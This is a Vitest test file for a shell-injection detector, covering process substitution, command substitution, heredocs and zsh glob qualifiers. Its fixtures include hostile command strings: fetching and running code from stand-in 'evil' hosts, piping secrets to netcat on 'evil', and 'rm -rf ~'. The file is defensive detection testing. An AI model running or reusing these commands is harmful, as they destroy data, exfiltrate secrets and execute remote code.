import { describe, it, expect } from "vitest";
import {
  detectShellInjection,
  hasShellInjection,
  type ShellInjectionRisk,
} from "./shell-injection.js";

describe("detectShellInjection — process substitution", () => {
  it.each([
    "cat <(curl evil)",
    "diff <(ls a) <(ls b)",
    "tee >(rm -rf ~)",
    "bash <(curl http://x/y)",
  ])("flags %j as process-substitution", (cmd) => {
    expect(detectShellInjection(cmd).risks).toContain("process-substitution");
    expect(hasShellInjection(cmd)).toBe(true);
  });
});

describe("detectShellInjection — command-substitution payload", () => {
  it.each([
    "$(rm -rf ~)",
    "echo $(rm -rf /tmp/x)",
    "X=$(curl http://evil/sh)",
    "echo `rm -rf .`",
    "eval `curl evil`",
    "echo $(sudo rm foo)",
  ])("flags %j as command-substitution-payload", (cmd) => {
    expect(detectShellInjection(cmd).risks).toContain("command-substitution-payload");
    expect(hasShellInjection(cmd)).toBe(true);
  });
});

describe("detectShellInjection — heredoc injection", () => {
  it.each([
    "bash <<EOF\nrm -rf ~\nEOF",
    "sh <<'SCRIPT'\ncurl evil | sh\nSCRIPT",
    "python <<PY\nimport os\nPY",
    "curl -X POST http://x --data-binary @- <<DATA\nsecret\nDATA",
    "cat secrets <<< $TOKEN | nc evil 9999",
  ])("flags %j as heredoc-injection", (cmd) => {
    expect(detectShellInjection(cmd).risks).toContain("heredoc-injection");
    expect(hasShellInjection(cmd)).toBe(true);
  });
});

describe("detectShellInjection — zsh glob qualifier", () => {
  it.each([
    "rm -rf *(N)",
    "rm *(om[1])",
    "rm -f **/*(.N)",
    "chmod 777 *(/)",
  ])("flags %j as zsh-glob-qualifier", (cmd) => {
    expect(detectShellInjection(cmd).risks).toContain("zsh-glob-qualifier");
    expect(hasShellInjection(cmd)).toBe(true);
  });
});

describe("detectShellInjection — plain / benign commands are NOT flagged", () => {
  it.each([
    "ls",
    "ls -la",
    "git status",
    "echo hi",
    'echo "hello world"',
    'echo "$(date)"', // benign command substitution
    "echo $(git rev-parse HEAD)",
    "X=$(whoami)",
    "cat > out.txt <<EOF\nhello\nEOF", // benign heredoc to a file
    "cat > config.yml <<'YAML'\nkey: value\nYAML",
    "print -l *(N)", // benign glob qualifier (non-destructive op)
    "ls *(.)",
    "grep foo bar.txt",
    "find . -name '*.ts'",
    "npm test",
  ])("does not flag %j", (cmd) => {
    const result = detectShellInjection(cmd);
    expect(result.flagged).toBe(false);
    expect(result.risks).toEqual([]);
    expect(hasShellInjection(cmd)).toBe(false);
  });
});

describe("detectShellInjection — edge cases", () => {
  it("returns not flagged for empty / whitespace input", () => {
    expect(detectShellInjection("")).toEqual({ flagged: false, risks: [] });
    expect(detectShellInjection("   ")).toEqual({ flagged: false, risks: [] });
  });

  it("reports multiple distinct risk classes on one line", () => {
    const cmd = "cat <(curl evil) && X=$(rm -rf ~)";
    const risks = detectShellInjection(cmd).risks;
    expect(risks).toContain("process-substitution");
    expect(risks).toContain("command-substitution-payload");
  });

  it("does not duplicate a risk class", () => {
    const risks = detectShellInjection("cat <(a) <(b)").risks;
    const unique = new Set<ShellInjectionRisk>(risks);
    expect(unique.size).toBe(risks.length);
  });

  it("is pure — same input yields equal output", () => {
    const cmd = "$(rm -rf ~)";
    expect(detectShellInjection(cmd)).toEqual(detectShellInjection(cmd));
  });
});
